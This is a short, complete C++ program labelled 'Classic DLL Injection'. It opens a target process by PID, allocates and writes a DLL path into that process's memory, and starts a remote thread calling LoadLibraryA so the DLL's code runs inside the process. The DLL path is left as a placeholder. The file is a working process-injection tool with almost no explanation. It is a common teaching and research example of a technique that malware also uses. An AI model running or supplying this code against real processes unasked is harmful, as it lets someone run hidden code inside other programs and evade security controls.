//Classic DLL Injection

#include<iostream>
#include<windows.h>

using namespace std;

int main(int argc, char * argv[]){

	if(argc != 2){
		cout<<"Usage: <PID>"<<endl;
		exit(-1);
	}

	HANDLE target_process, remote_thread;
	LPVOID alloc;
	BOOL write_proc;
	LPVOID pdll_path;
	LPCSTR dll_path = "## ENTER PATH TO DLL ##";  //path to dll 

	//Open remote process
	target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	if(target_process == NULL){
		cout<<"Error setting handle to process"<<endl;
		return 0;
	}

	//Allocate memory for dll path string
	pdll_path = VirtualAllocEx(target_process, NULL, strlen(dll_path) + 1, MEM_COMMIT, PAGE_READWRITE);
	if(pdll_path == NULL){
		cout<<"Error allocating memory in remote process"<<endl;
		return 1;
	}

	//write dll path to memory
	write_proc = WriteProcessMemory(target_process, pdll_path, dll_path, strlen(dll_path), NULL);

	//Create remote thread to execute LoadLibrary with the dll path that will execute DLLMain
	remote_thread = CreateRemoteThread(target_process, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"),"LoadLibraryA"), pdll_path, 0, 0);
	if(remote_thread == NULL){
		cout<<"Error creating remote thread"<<endl;
		return 1;
	}

	//Wait for signal to remote_thread
	WaitForSingleObject(remote_thread, INFINITE);

	//Free dll path string from process memory
	VirtualFreeEx(target_process, pdll_path, strlen(dll_path) + 1, MEM_RELEASE);

	return 0;
}